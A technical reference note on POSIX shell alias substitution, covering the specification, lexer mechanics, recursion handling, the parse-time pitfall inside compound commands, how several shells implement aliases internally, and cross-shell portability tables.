---
type: concept
track: [sde, distinguished]
level:
status: solid
last_reviewed:
sources:
  - "https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/utilities/alias.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/utilities/unalias.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap03.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/xrat/V4_xcu_chap01.html"
  - "https://austingroupbugs.net/view.php?id=854"
  - "https://austingroupbugs.net/view.php?id=953"
  - "https://austingroupbugs.net/view.php?id=1055"
  - "https://austingroupbugs.net/view.php?id=1630"
  - "https://git.savannah.gnu.org/cgit/bash.git/plain/alias.c"
  - "https://git.savannah.gnu.org/cgit/bash.git/plain/alias.h"
  - "https://git.savannah.gnu.org/cgit/bash.git/plain/parse.y"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/alias.c"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/alias.h"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/parser.c"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/input.c"
  - "https://raw.githubusercontent.com/zsh-users/zsh/master/Src/lex.c"
  - "https://raw.githubusercontent.com/zsh-users/zsh/master/Src/hashtable.c"
  - "https://raw.githubusercontent.com/magicant/yash/master/alias.c"
  - "https://raw.githubusercontent.com/mirror/busybox/master/shell/ash.c"
  - "https://raw.githubusercontent.com/MirBSD/mksh/master/lex.c"
  - "https://raw.githubusercontent.com/MirBSD/mksh/master/funcs.c"
  - "https://salsa.debian.org/clint/posh/-/raw/master/lex.c"
  - "https://salsa.debian.org/clint/posh/-/raw/master/debian/changelog"
  - "https://raw.githubusercontent.com/torvalds/linux/master/fs/exec.c"
  - "https://www.gnu.org/software/bash/manual/html_node/Aliases.html"
  - "https://cveawg.mitre.org/api/cve/CVE-2026-55582"
  - "https://github.com/sonirico/mcp-shell/security/advisories/GHSA-74hp-mggr-hv58"
  - "https://ftpmirror.gnu.org/bash/bash-5.3.tar.gz"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/input.h?h=v0.5.12"
  - "https://git.kernel.org/pub/scm/utils/dash/dash.git/plain/src/input.c?h=v0.5.12"
  - "https://raw.githubusercontent.com/MirBSD/mksh/master/main.c"
  - "https://raw.githubusercontent.com/git/git/master/git.c"
  - "https://raw.githubusercontent.com/git/git/master/Documentation/git.adoc"
---

# Aliases

> [!summary] Claim
> Alias substitution is a parse-time lexical source-text rewriting pass that replaces eligible unquoted command words with arbitrary replacement strings on the lexer input stream during token recognition before grammar validation or runtime word expansion occurs.

Part of [The POSIX Shell Language](README.md) in [Shell and Unix Engineering](../README.md).

## TL;DR

- Mechanism: During lexical token recognition ([[Token-Recognition]]), the shell checks unquoted command words against an in-memory hash table of alias definitions and pushes any matching replacement string directly back onto the lexer input stream (`(POSIX.1-2024 XCU 2.3.1)`).
- Rule: If an alias replacement value ends with an unquoted blank (`<space>` or `<tab>`), the shell flags the immediately following token for recursive alias substitution, enabling chained wrappers such as `alias sudo='sudo '` (`(POSIX.1-2024 XCU 2.3.1)`).
- Trap: Because alias substitution executes entirely during parsing rather than execution, aliases defined within a compound command (`if`, `while`, `for`, `{ ...; }`) or function body are invisible to subsequent commands inside that same block without [[The-eval-Builtin|eval]] (POSIX permits this deferral up to the end of the `complete_command`, `(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3.1; Austin Group Defect 1055)`; every alias-capable shell in the matrix defers, proved by lab as of 2026-10).
- Portability fact: GNU `bash` disables alias expansion by default in non-interactive shell scripts unless `shopt -s expand_aliases` or POSIX mode (`bash --posix` or `sh`) is enabled, whereas `dash`, `ksh93`, `mksh`, `zsh`, `yash`, and BusyBox `ash` expand aliases non-interactively by default, and `posh` omits `alias` and `unalias` entirely with exit status 127 (`(bash-5.3 shell.c, init_noninteractive; general.c, posix_initialize)`; proved by lab as of 2026-10).
- When not to use it: Never use aliases in shell scripts or production automation for modularity, parameterized wrappers, or abstraction; use POSIX shell functions ([[Functions-and-Scope]]) or dedicated executable scripts in `PATH` ([[Command-Search-and-PATH]]).

## Mental model

```mermaid
flowchart TD
  Src["Input Stream / Source Text<br/>e.g. 'sudo ls /tmp'"] --> Tok["Lexical Scanner: yylex()<br/>Read character sequence"]
  Tok --> Cand{"Categorized as TOKEN?<br/>(XCU 2.3, 2.10.1)"}
  Cand -- "No (Operator, newline, EOF)" --> Grammar["Shell Grammar Parser<br/>yyparse() / AST Node"]
  Cand -- "Yes" --> QuoteCheck{"Contains quotes?<br/>('\', ''', '"')"}
  QuoteCheck -- "Yes: \cmd or 'cmd'" --> NoAlias["Suppress Alias Substitution<br/>(XCU 2.3.1 Cond 1)"]
  NoAlias --> Grammar
  QuoteCheck -- "No (Unquoted word)" --> PosCheck{"Command word position<br/>OR after blank alias?<br/>(XCU 2.3.1 Cond 5)"}
  PosCheck -- "No" --> Grammar
  PosCheck -- "Yes" --> Lookup{"In Alias Hash Table?<br/>(XBD 3.10 name)"}
  Lookup -- "Not Found" --> Grammar
  Lookup -- "Found definition" --> InUse{"Already in use?<br/>(AL_BEINGEXPANDED / ALIASINUSE)"}
  InUse -- "Yes (Cycle detected)" --> CycleStop["Terminate Recursion<br/>Emit token as literal command"]
  CycleStop --> Grammar
  InUse -- "No (Eligible)" --> Push["Push Value onto Input Stack<br/>pushstring(val) / inpush(val)<br/>Set ALIASINUSE flag"]
  Push --> TrailingCheck{"Ends with unquoted blank?<br/>(' ' or '\t')"}
  TrailingCheck -- "Yes" --> SetNext["Set flag: ALEXPNEXT<br/>Check following token"]
  TrailingCheck -- "No" --> ClearNext["Clear ALEXPNEXT flag"]
  SetNext --> Rescan["Resume Token Recognition<br/>at start of replacement string"]
  ClearNext --> Rescan
  Rescan --> Tok
  Grammar --> AST["Abstract Syntax Tree<br/>Complete Command"]
  AST --> Exec["Step 1-4 Word Expansions<br/>-> execve(path, argv, envp)"]
```

An input character stream enters the lexical analyzer (`yylex()`), which categorizes characters into operators, delimiters, and word tokens per [[Token-Recognition]].
When a candidate word token is formed, the lexer inspects it against five cumulative conditions before consulting the grammar parser: it verifies that the token contains no quoting characters, is a syntactically valid alias name per `(POSIX.1-2024 XBD 3.10)`, occupies a command-word position or follows a blank-terminated alias, and exists in the alias hash table.
If the alias is currently flagged as active in the lexer pushdown stack (`AL_BEINGEXPANDED` in `bash`, `ALIASINUSE` in `dash` and BusyBox `ash`), cycle detection aborts further expansion to prevent infinite recursion, passing the literal word to the grammar.
If the token is eligible, the shell sets its in-use flag and pushes the alias value onto an in-memory input stack (`pushstring()`, `push_string()`, or `inpush()`), resuming token recognition at the first byte of the replacement string.
If the replacement value ends with an unquoted blank, the lexer sets a trailing-blank state flag (`PST_ALEXPNEXT` from the alias's `AL_EXPANDNEXT` bit in `bash`, `CHKALIAS` in `dash`) instructing itself to evaluate the next incoming token for alias substitution as well.
The re-tokenized character stream proceeds to the grammar parser ([[Shell-Grammar]]), builds an abstract syntax tree representing a complete command, passes through word expansion ([[Expansion-Order]]), and executes via `execve(2)`.

## How it works

### Specification: POSIX.1-2024 XCU 2.3.1 and Austin Group Defects

POSIX.1-2024 defines alias substitution in `(POSIX.1-2024 XCU 2.3.1)` as an integral phase of lexical tokenization, shaped by four Austin Group defects applied in Issue 8:
- Austin Group Defect 854 established in Issue 8 that the `alias` utility is required to be an intrinsic shell utility (`(POSIX.1-2024 XCU alias APPLICATION USAGE and CHANGE HISTORY)`), confirming that external binaries such as `/usr/bin/alias` cannot substitute for the shell built-in because aliases directly modify parser state.
- Austin Group Defect 953 ("Alias expansion is under-specified") and Defect 1630 provided additional detail on how alias substitution is performed, including re-tokenization when alias replacement values end in operator characters or trailing blanks (`(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3.1)`).
- Austin Group Defect 1055 ("unspecified how much is parsed before execution begins") resolved the timing relationship between parsing units (`compound_list` versus `complete_command`) and alias table visibility: a change may be deferred, but no later than the completion of the currently executing `complete_command` (`(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3)`).
- Austin Group Defect 1630 was filed by the `mksh` maintainer asking to forbid alias names that begin with `-` or `+`, but it was accepted as marked without that restriction: it reworded condition 5 of `(POSIX.1-2024 XCU 2.3.1)` to cover tokens that follow a blank-terminated alias and added the `alias -- -0='-0 '` example for chained option wrappers to the `alias` EXAMPLES, so `(POSIX.1-2024 XBD 3.10)` still allows `-` anywhere in an alias name (Austin Group Defect 1630, final accepted text bugnote 6266).

### Lexical source-text rewriting versus runtime word expansion

Alias substitution is fundamentally distinct from parameter expansion ([[Parameter-Expansion]]), command substitution ([[Command-Substitution]]), and arithmetic expansion ([[Arithmetic-Expansion]]).
Word expansions execute at step 1 of command processing ([[Expansion-Order]]) on arguments that have already been parsed into simple command nodes ([[Simple-Commands-and-Assignment-Prefixes]]).
Consequently, an unquoted variable expansion like `cmd='ls | wc -l'; $cmd` can never create a pipeline ([[Pipelines-and-And-Or-Lists]]), redirection ([[Redirection-Order-and-Semantics]]), or compound command, because metacharacters resulting from parameter expansion are treated solely as argument bytes, not grammatical operators (`(POSIX.1-2024 XCU 2.6)`).
In contrast, alias substitution operates during lexical scanning prior to grammar compilation.
When an alias value contains metacharacters such as `|`, `&&`, `>`, or `{`, the shell pushes those literal bytes back into the lexer input stream and re-runs token recognition from the start of the replacement text (`(POSIX.1-2024 XCU 2.3.1)`).
The lexer recognizes those pushed metacharacters as true structural operators, permitting an alias to manufacture pipelines, redirects, background asynchronous lists, or control flow constructs dynamically.

### The five eligibility conditions and reserved-word precedence

Under `(POSIX.1-2024 XCU 2.3.1)`, a lexical token categorized as `TOKEN` is subject to alias substitution if and only if all five of the following conditions evaluate to true:
1. The `TOKEN` does not contain any quoting characters: A backslash `\`, single quote `'`, or double quote `"` anywhere in the token disqualifies it from alias lookup (`(POSIX.1-2024 XCU 2.3.1 Cond 1)`).
   Typing `\ls`, `'ls'`, `"ls"`, or `l\s` forces the shell to bypass the alias table entirely and proceed directly to utility lookup ([[Command-Search-and-PATH]]).
2. The `TOKEN` is a valid alias name: Per `(POSIX.1-2024 XBD 3.10)`, the name must consist solely of alphanumeric characters from the portable character set and the symbols `!`, `%`, `,`, `-`, `@`, and `_`, with no restriction on which of them comes first (the standard's own example defines `alias -- -0='-0 '`).
   Names containing slashes `/` are strictly invalid alias names, guaranteeing that absolute and relative pathnames like `/bin/ls` or `./run` never match the alias table.
3. An alias with that exact name is currently in effect: The alias must exist within the shell execution environment's active table (`(POSIX.1-2024 XCU 2.13)`).
4. The `TOKEN` did not result from an earlier alias substitution of the same name: The token must not have originated, either fully or partially, from an alias substitution of that identical name at any earlier recursion level in the active pushdown stack.
5. The token occupies an eligible command position: Either the token could be parsed as the command name word of a simple command based on the preceding tokens, or it follows an alias substitution whose replacement value ended with an unquoted blank (`(POSIX.1-2024 XCU 2.3.1 Cond 5)`).

If a candidate token meets all five conditions but would also be recognized as a reserved word ([[Shell-Grammar]], such as `while`, `if`, or `for`), `(POSIX.1-2024 XCU 2.3.1)` specifies that it is unspecified whether alias substitution occurs.
In `dash`, `ksh93`, `mksh`, `yash`, BusyBox `ash`, `bash` in POSIX mode, and `zsh --emulate sh`, reserved words take lexical precedence over aliases in grammatical reserved-word positions, whereas native `bash` and native `zsh` consult the alias table first, so after `alias if='echo aliased_if'` a bare `if` runs `echo` (measured in the shell matrix as of 2026-10; `(bash-5.3 parse.y, read_token_word)` checks reserved words before aliases only when `posixly_correct` is set).
An alias named like a reserved word (e.g., `alias while='/'`) does expand in a non-reserved position following a blank-terminated alias, as in the standard's `alias foo="/bin/ls "; foo while` example (`(POSIX.1-2024 XRAT C.2.3.1)`).

### Trailing blank chaining and operator token boundary ambiguities

When an alias replacement value ends in an unquoted blank (`<space>` or `<tab>`), the shell sets an internal state flag instructing the lexer to subject the immediately following token to alias substitution (`(POSIX.1-2024 XCU 2.3.1)`).
This mechanism allows command wrappers to chain alias expansions across multiple words:
- Setting `alias sudo='sudo '` allows `sudo ll` to expand `sudo` first and then immediately expand `ll` into `ls -l`.
- Setting `alias nohup='nohup '` or `alias xargs='xargs '` similarly propagates alias resolution to the utility's first operand.
- Chaining continues indefinitely across successive words as long as each consecutive alias ends in an unquoted blank.
  A repeated input word is a fresh token, so it is substituted again: with `alias s='f '`, the input `s s s x` runs `f f f x` in every alias-capable matrix shell (proved by lab as of 2026-10).

However, token boundary resolution at the tail of an alias introduces a major portability divergence when the alias value does not end in a blank:
- In GNU `bash` 5.3, `shell_getc()` returns one extra `<space>` byte (`0x20`) when it reaches the end of an alias expansion whose last character is not a blank, newline, or shell metacharacter (the `PST_ENDALIAS` state); older releases appended the same space in `mk_alexpansion()`, which now does so only under `OLD_ALIAS_HACK` (`(bash-5.3 parse.y, shell_getc and mk_alexpansion)`).
- In `zsh`, `checkalias()` pushes a `" "` onto the input stack before the alias text whenever the next input character is not blank (`(zsh Src/lex.c, checkalias)`).
- POSIX allows this extra space but notes that a future version may disallow it, and the rationale encourages shells that add it to find another way to delimit a partial operator token (`(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3.1)`).
- In `dash`, `ksh93`, BusyBox `ash`, `mksh`, and `yash`, the replacement text is pushed verbatim without any injected space (`(dash-0.5.12 src/input.c, pushstring)`; measured in the shell matrix as of 2026-10).
- Consequently, when evaluating `alias zero='echo 0'; zero>&2`, GNU `bash` and `zsh` separate `0` and `>&2`, passing argument `'0'` to `echo` and redirecting standard output to standard error (`echo 0 >&2`).
- Under `dash`, `ksh93`, BusyBox `ash`, `mksh`, and `yash`, the absence of an injected space causes `0` and `>&2` to fuse into the single redirection operator `0>&2` (redirect file descriptor 0 from 2), leaving `echo` with zero arguments and printing an empty line to stdout (`(POSIX.1-2024 XCU 2.3.1; XCU alias APPLICATION USAGE)`; proved by lab as of 2026-10).
- In `posh`, invoking `alias` fails immediately with exit status 127 because the `alias` built-in is entirely absent (measured in the shell matrix as of 2026-10).
- As documented in `(POSIX.1-2024 XCU alias APPLICATION USAGE)`, enclosing the trailing digit in quotes (`alias zero='echo "0"'`) prevents operator fusion portably across all shell families.

### Recursion prevention and cycle detection mechanisms

To prevent infinite loops when an alias references itself or forms a mutual recursion cycle, shells implement stack-based cycle detection during token recognition:
- **Direct self-recursion (`alias ls='ls -F'`)**:
  When `ls` is read, the shell verifies that `ls` is not currently flagged as in-use.
  It marks the `ls` alias structure with an active flag (`AL_BEINGEXPANDED` in `bash`, `ALIASINUSE` in `dash` and BusyBox `ash`, `an->inuse` in `zsh`) and pushes `ls -F` onto the input stream.
  The lexer resumes scanning at `ls`.
  Because `ls` is now flagged as in-use, condition 4 of `(POSIX.1-2024 XCU 2.3.1)` fails.
  The shell stops expansion and emits `ls` as a literal command word.
- **Mutual cycle recursion (`alias a='b ' b='a '`)**:
  When `a` is read, it expands to `b ` and sets the in-use flag on `a`.
  Because `b ` ends in a blank, the lexer inspects `b`.
  The alias `b` expands to `a `, marking `b` in-use.
  The trailing blank on `a ` prompts another lookup of `a`.
  Because `a` is already flagged in the ancestor stack, the cycle terminates immediately.
  The token `a` is emitted as a literal word, and execution attempts to invoke `a` as an external binary or function.
- **In-flight memory management**:
  If a script executes `unalias foo` while `foo` is actively expanding on the pushdown stack, `dash` and BusyBox `ash` prevent use-after-free bugs by setting an `ALIASDEAD` flag (`(dash src/alias.c, freealias)`).
  The memory node is retained until `popstring()` and `freestrings()` unwind the input frame, at which point the structure is safely freed (`(dash-0.5.12 src/input.c, freestrings)`).

### The compound command and function definition parse barrier

The single most common bug encountered with shell aliases arises from the disconnect between **parse time** and **execution time** (`(POSIX.1-2024 XRAT C.2.3.1; Austin Group Defect 1055)`).
The shell executes programs by parsing input into grammatical units before executing them:
- Top-level commands separated by newlines are parsed and executed as individual `complete_command` units.
- Any compound command (`if ... fi`, `for ... done`, `while ... done`, `case ... esac`, `{ ...; }`, or a function body `name() { ... }`) is parsed as a single `compound_list` grammar production in its entirety before any statement inside it begins executing (`(POSIX.1-2024 XCU 2.10; Austin Group Defect 1055)`).
- When a script defines an alias inside a compound command and attempts to use it later in the same block:
  ```sh
  if true; then
    alias mycmd='echo active'
    mycmd
  fi
  ```
  The lexer parses `mycmd` before `alias mycmd` has ever run.
  At parse time, `mycmd` is not in the alias table.
  The lexer compiles `mycmd` as a standard command word.
  When the block executes, the `alias` command populates the table, but the subsequent compiled AST node executes without alias substitution, triggering a runtime `command not found` error (POSIX permits but does not require this deferral, `(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3.1)`; every alias-capable matrix shell defers, proved by lab as of 2026-10).
- Similarly, when a function definition `f() { mycmd; }` is read, `mycmd` is permanently compiled into the function's AST using the alias table active at definition time.
  Subsequent mutations or deletions of the alias via `unalias` have zero effect on the compiled function body: after `alias mycmd='echo ONE'`, `f() { mycmd; }`, and then either `unalias mycmd` or `alias mycmd='echo TWO'`, calling `f` still ran the original alias text in every alias-capable shell tried (macOS host `bash` 3.2.57 and 5.3.20 with `expand_aliases` or `--posix`, `zsh`, `dash`, `ksh`; Debian and Alpine matrix `bash`, `dash`, `mksh`, `zsh`, BusyBox `ash`; Debian `ksh`; Alpine `yash`) (measured in the shell matrix as of 2026-10).
- To execute dynamically defined aliases within compound blocks, a script must force a runtime invocation of the parser using `eval mycmd` ([[The-eval-Builtin]]).

### Implementation internals across shell engines

Production shells implement alias resolution using distinct internal data structures:
1. **GNU `bash` (`parse.y`, `alias.c`, `alias.h`)**:
   `bash` stores aliases in a separately chained hash table `aliases` (the generic `hashlib.c` table, whose buckets are linked lists) initialized to 64 buckets (`ALIAS_HASH_BUCKETS`) in `initialize_aliases()` (`(bash-5.3 alias.c; hashlib.c)`).
   Each `alias_t` node contains `char *name`, `char *value`, and `char flags` (`AL_EXPANDNEXT = 0x1`, `AL_BEINGEXPANDED = 0x2`) (`(bash-5.3 alias.h)`).
   During `read_token_word()`, `alias_expand_token()` checks eligibility against `assignment_acceptable(last_read_token)` or `parser_state & PST_ALEXPNEXT` (`(bash-5.3 parse.y)`).
   If eligible, `mk_alexpansion()` copies the value into a new buffer and `push_string()` pushes a `STRING_SAVER` node onto `pushed_string_list`; the trailing `<space>` that keeps the alias marked in use while its last word is read is now returned by `shell_getc()` at the end of the pushed string, not appended by `mk_alexpansion()` (`(bash-5.3 parse.y)`).
   In non-interactive shells, `expand_aliases` (declared in `parse.y`) is set to the value of `posixly_correct` by `init_noninteractive()`, so it is `0` (disabled) unless POSIX mode is active (`(bash-5.3 shell.c, init_noninteractive)`).
2. **`dash` (`src/alias.c`, `src/parser.c`, `src/input.c`)**:
   `dash` maintains a statically sized hash table `struct alias *atab[39]` (`ATABSIZE = 39`) (`(dash src/alias.c)`).
   Each node contains `struct alias *next`, `char *name`, `char *val`, and `int flag` (`ALIASINUSE = 1`, `ALIASDEAD = 2`) (`(dash src/alias.h)`).
   Inside `readtoken()`, after the reserved-word check (`findkwd()`), `kwd & CHKALIAS` triggers `lookupalias(wordtext, 1)` (`(dash src/parser.c, readtoken)`).
   If found, `pushstring(ap->val, ap)` allocates a `struct strpush` frame, marks `ap->flag |= ALIASINUSE`, redirects `parsefile->nextc` to the alias string, and jumps to `top:` (`(dash-0.5.12 src/parser.c; src/input.c)`).
   When the string ends, `popstring()` checks if `nextc[-1]` is a space or tab; if so, it sets `checkkwd |= CHKALIAS` (`(dash-0.5.12 src/input.c)`).
3. **`zsh` (`Src/lex.c`, `Src/hashtable.c`)**:
   `zsh` divides aliases into regular/global aliases in `aliastab` (23 buckets) and suffix aliases in `sufaliastab` (11 buckets) (`(zsh Src/hashtable.c, createaliastables)`, checked on master as of 2026-10).
   In `checkalias()`, `zsh` checks `!an->inuse` and tests whether the alias is global (`ALIAS_GLOBAL`, defined via `alias -g`), in command position (`incmdpos`), or preceded by a blank-terminated alias (`inalmore`) (`(zsh Src/lex.c, checkalias)`).
   If the token matches a file extension `.ext` and `sufaliastab` contains `ext`, `zsh` pushes the suffix alias command followed by the filename, implementing suffix execution (`(zsh Src/lex.c, checkalias)`).
   Input stack manipulation is performed via `inpush(an->text, INP_ALIAS, an)`, preceded by `inpush(" ", INP_ALIAS, 0)` when the next input character is not blank (`(zsh Src/lex.c, checkalias)`).
4. **BusyBox `ash` (`shell/ash.c`)**:
   Mirrors `dash`'s Almquist architecture under `#if ENABLE_ASH_ALIAS`, using a dynamically allocated hash table `atab` of 39 buckets (`ATABSIZE`, allocated by `INIT_G_alias()`), `ALIASINUSE`, and `ALIASDEAD` (`(BusyBox shell/ash.c)`, checked on master as of 2026-10).
5. **`mksh` (`funcs.c`, `lex.c`)**:
   Derived from pdksh, `mksh` manages aliases in an in-memory symbol table via `c_alias()` in `funcs.c` and pushes expansions onto a generic input source stack via `pushs(SALIAS, ...)` in `lex.c` (`(mksh funcs.c, c_alias; lex.c)`).
   When querying an undefined alias (`alias nonexistent`), `c_alias()` calls `shprintf()` rather than `sherrorf()`, leaking its diagnostic message to standard output rather than standard error before exiting with status 1 (`(mksh funcs.c, c_alias)`).
   Furthermore, `mksh` initializes several built-in aliases at startup (including `autoload`, `functions`, `hash`, `history`, `integer`, `local`, `nohup`, `r`, and `type`), which are cleared when `unalias -a` executes (`(mksh main.c, initcoms)`; measured in the shell matrix as of 2026-10).
6. **`posh` (Policy-compliant Ordinary Shell)**:
   While originally derived from pdksh, Debian `posh` 0.14.1 has no `alias` or `unalias` built-in and no alias expansion, causing both `alias` and `unalias` invocations to exit with status 127 (`posh: alias: not found`) (measured in the shell matrix as of 2026-10).
   This is not a POSIX allowance: `alias` moved from the User Portability Utilities option to the Base in Issue 7 (`(POSIX.1-2024 XCU alias CHANGE HISTORY)`), so a shell without it does not conform.
   The `posh` changelog records only that the `alias` and `unalias` built-ins were removed in version 0.0.1 (19 June 2002, copied from pdksh 5.2.14-6) and gives no reason (`(posh debian/changelog, 0.0.1)`).

### Down to the system call

Alias substitution executes entirely in user-space memory within the shell's lexical tokenizer.
It issues no system calls of its own during lookup, stack pushing, or string rewriting (the buffer allocations can reach `brk(2)` or `mmap(2)` only through `malloc(3)` when the heap must grow).
Once the grammar parser completes an abstract syntax tree from the re-tokenized source, the shell executes the resulting simple command:
- If the resolved command name is a shell built-in or function, it executes in user space without kernel intervention (unless redirection involves `open(2)` or `dup2(2)`).
- If the command resolves to an external filesystem utility, the shell invokes `fork(2)` (or `posix_spawn(3)`) followed by `execve(path, argv, envp)`.
Inside the kernel (`fs/exec.c`, `bprm_execve`), the kernel never sees the shell's token list.
It sees only the `argv` pointer array that the shell passed to `execve(2)`; since Linux 5.9 `bprm_execve()` is called from `do_execveat_common()` only after `copy_strings()` has already copied the `envp` and `argv` strings into the new program's `struct linux_binprm` (`(Linux fs/exec.c, do_execveat_common and bprm_execve)`).
The kernel has zero awareness that alias substitution occurred: alias tables exist solely as volatile process memory within the parent shell interpreter.

## Numbers and limits

| Metric or Limit | Value | Source and Date |
|---|---|---|
| GNU `bash` alias hash table bucket count (`ALIAS_HASH_BUCKETS`) | `64` buckets (power of two) | `(bash-5.3 alias.c, initialize_aliases)`; verified in source (as of 2026-10) |
| `dash` alias hash table bucket count (`ATABSIZE`) | `39` buckets | `(dash src/alias.c, ATABSIZE)`; verified in source (as of 2026-10) |
| BusyBox `ash` alias hash table bucket count (`ATABSIZE`) | `39` buckets | `(BusyBox shell/ash.c, INIT_G_alias)`; verified in master source (as of 2026-10) |
| `zsh` regular and global alias hash table size (`aliastab`) | `23` buckets | `(zsh Src/hashtable.c, createaliastables)`; verified in master source (as of 2026-10) |
| `zsh` suffix alias hash table size (`sufaliastab`) | `11` buckets | `(zsh Src/hashtable.c, createaliastables)`; verified in master source (as of 2026-10) |
| GNU `bash` `alias_t` struct size on LP64 architecture | `24` bytes (`name` 8B, `value` 8B, `flags` 1B, 7B padding) | `(bash-5.3 alias.h, alias_t)`; verified in source and by `sizeof` on arm64 macOS (as of 2026-10) |
| `dash` `struct alias` node size on LP64 architecture | `32` bytes (`next` 8B, `name` 8B, `val` 8B, `flag` 4B, 4B padding) | `(dash src/alias.h, struct alias)`; verified in source and by `sizeof` on arm64 macOS (as of 2026-10) |
| `dash` `struct strpush` input frame size on LP64 architecture | `64` bytes in 0.5.12 (`prev` 8B, `prevstring` 8B, `prevnleft` 4B + 4B padding, `ap` 8B, `string` 8B, `spfree` 8B, `lastc[2]` 8B, `unget` 4B + 4B padding); `56` bytes on current master, which dropped `lastc[2]` | `(dash-0.5.12 src/input.h, struct strpush)`; verified in source and by `sizeof` on arm64 macOS (as of 2026-10) |
| Trailing space byte returned by GNU `bash` `shell_getc()` at the end of an alias (formerly appended by `mk_alexpansion()`) | `1` byte: `0x20` (ASCII space) | `(bash-5.3 parse.y, shell_getc)`; proved by lab (as of 2026-10) |
| Permitted portable characters in alias names (`POSIX.1-2024 XBD 3.10`) | `68` characters (26 uppercase, 26 lowercase, 10 digits, `! % , - @ _`) | `(POSIX.1-2024 XBD 3.10)` |
| Maximum recursion depth for identical alias name | `1` expansion level (self-recursion aborted on second lookup) | `(POSIX.1-2024 XCU 2.3.1 Cond 4)`; proved by lab (as of 2026-10) |
| Default non-interactive script alias expansion state (`expand_aliases`) | `0` (off) in `bash` default; `1` (on) in `bash --posix`, `dash`, `ksh93`, `zsh`, `yash`, BusyBox `ash`, `mksh`; absent in `posh` (status 127) | `(bash-5.3 shell.c, init_noninteractive; general.c, posix_initialize)`; proved by lab (as of 2026-10) |
| Exit status of `alias name` when definition is not found | `1` in `bash`, `dash`, `ksh93`, `zsh`, `yash`, BusyBox `ash`, `mksh`; `127` in `posh` (utility absent) | `(POSIX.1-2024 XCU alias EXIT STATUS)`; proved by lab (as of 2026-10) |
| Diagnostic stream for missing alias lookup (`alias nonexistent`) | `stderr` (fd 2) in `bash`, `dash`, `ksh93`, `yash`, BusyBox `ash`; no message at all in `zsh`; `stdout` (fd 1) in `mksh` | `(mksh funcs.c, c_alias)`; proved by lab (as of 2026-10) |
| Exit status of `unalias -a` under empty or populated alias table | `0` in conforming shells; `127` in `posh` (utility absent) | `(POSIX.1-2024 XCU unalias EXIT STATUS)`; proved by lab (as of 2026-10) |

## Portability

| Behavior / Scenario | POSIX.1-2024 (`sh`) | macOS `bash` 3.2 | GNU `bash` 5.3 | `zsh` 5.9 (native) | `zsh` 5.9 (`--emulate sh`) | `dash` 0.5.12 / 0.5.13 | `ksh93` (`93u+` / `93u+m 1.0.10`) | `mksh` / `yash` / BusyBox `ash` | `posh` 0.14.1 |
|---|---|---|---|---|---|---|---|---|---|
| Non-interactive script expansion by default (`sh script.sh`) | Required: XCU 2.3.1 has no interactive-only exception (`(POSIX.1-2024 XCU 2.3.1)`) | Off in `bash`; On in `/bin/sh` (lab) | Off in `bash`; On in `--posix` (lab) | On (`setopt aliases`) (lab) | On (`setopt aliases`) (lab) | On (lab) | On (lab) | On (lab) | Absent; exits 127 (lab) |
| Trailing blank chaining (`alias a="pfx "; alias b="target"; a b`) | Expands both `a` and `b` (`(POSIX.1-2024 XCU 2.3.1)`) | Expands both (lab) | Expands both (lab) | Expands both (lab) | Expands both (lab) | Expands both (lab) | Expands both (lab) | Expands both (lab) | Absent; exits 127 (lab) |
| Quoted command bypass (`\cmd`, `'cmd'`, `"cmd"`) | Suppresses alias (`(POSIX.1-2024 XCU 2.3.1 Cond 1)`) | Suppresses (lab) | Suppresses (lab) | Suppresses (lab) | Suppresses (lab) | Suppresses (lab) | Suppresses (lab) | Suppresses (lab) | Absent; exits 127 (lab) |
| Direct self-recursion termination (`alias ls='ls -F'`) | Terminates at depth 1 (`(POSIX.1-2024 XCU 2.3.1)`) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Terminates at depth 1 (lab) | Absent; exits 127 (lab) |
| Mutual recursion cycle (`alias a='b ' b='a '; a`) | Terminates on seen ancestor (`(POSIX.1-2024 XCU 2.3.1)`) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Terminates; runs `a` (lab) | Absent; exits 127 (lab) |
| Same compound command visibility (`if true; then alias x=y; x; fi`) | May be deferred until the `complete_command` completes (`(POSIX.1-2024 XCU 2.3.1; XRAT C.2.3.1)`) | Blocked (lab) | Blocked (lab) | Blocked (lab) | Blocked (lab) | Blocked (lab) | Blocked (lab) | Blocked (lab) | Absent; exits 127 (lab) |
| Dynamic `eval` inside compound command (`if true; then alias x=y; eval x; fi`) | Expands via runtime parser (`(POSIX.1-2024 XCU eval)`) | Expands (lab) | Expands (lab) | Expands (lab) | Expands (lab) | Expands (lab) | Expands (lab) | Expands (lab) | Absent; exits 127 (lab) |
| Operator token boundary without space (`alias zero='printf "%s" 0'; zero>&2`) | Unspecified (`(POSIX.1-2024 XCU 2.3.1; XCU alias APPLICATION USAGE)`) | Appends space; sends `0` to stderr (lab) | Appends space; sends `0` to stderr (lab) | Appends space; sends `0` to stderr (lab) | Appends space; sends `0` to stderr (lab) | Fuses `0>&2`; stderr empty (lab) | Fuses `0>&2`; stderr empty (lab) | Fuses `0>&2`; stderr empty (lab) | Absent; exits 127 (lab) |
